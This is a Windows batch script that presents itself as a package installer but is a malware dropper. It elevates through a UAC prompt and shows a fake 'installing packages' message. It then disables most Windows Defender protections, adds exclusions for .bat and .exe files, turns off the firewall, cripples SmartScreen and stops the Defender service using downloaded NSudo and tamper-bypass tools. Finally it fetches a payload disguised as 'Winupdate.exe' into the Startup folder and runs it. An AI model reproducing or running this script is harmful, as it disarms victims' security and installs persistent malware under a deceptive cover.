@echo off

:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
echo msgbox "Please Wait While we install necessary packages for You!.Window will be closed after Installation!!!!" > %tmp%\tmp.vbs
wscript %tmp%\tmp.vbs
del %tmp%\tmp.vbs

echo  Installing Necessary Packages.....Please Wait.......



powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""

powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""

powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"

powershell.exe -command "Set-MpPreference -PUAProtection disable"

powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"

powershell.exe -command "Set-MpPreference -DisableBehaviorMonitoring $true"

powershell.exe -command "Set-MpPreference -DisableBlockAtFirstSeen $true"

powershell.exe -command "Set-MpPreference -DisableIOAVProtection $true"

powershell.exe -command "Set-MpPreference -DisablePrivacyMode $true"

powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"

powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
powershell.exe -command "Set-MpPreference -DisableScriptScanning $true"
powershell.exe -command "Set-MpPreference -SubmitSamplesConsent 2"

powershell.exe -command "Set-MpPreference -MAPSReporting 0"
powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"
      
powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"

powershell.exe -command "netsh advfirewall set allprofiles state off"


cd  %temp%

bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe

set i=%systemroot%

set y=System32


NSudo.exe -U:T -ShowWindowMode:Hide icacls "%i%\%y%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18

 
NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend 

bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Disable-Tamper-Realtime-Protection/main/Disable-Tamper.cmd  %temp%\Disable-Tamper.cmd



cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

powershell -command "start-bitstransfer https://direct-url-for-payload/xxx.exe   .\Winupdate.exe"

start  Winupdate.exe & cd %temp% & Disable-Tamper.cmd

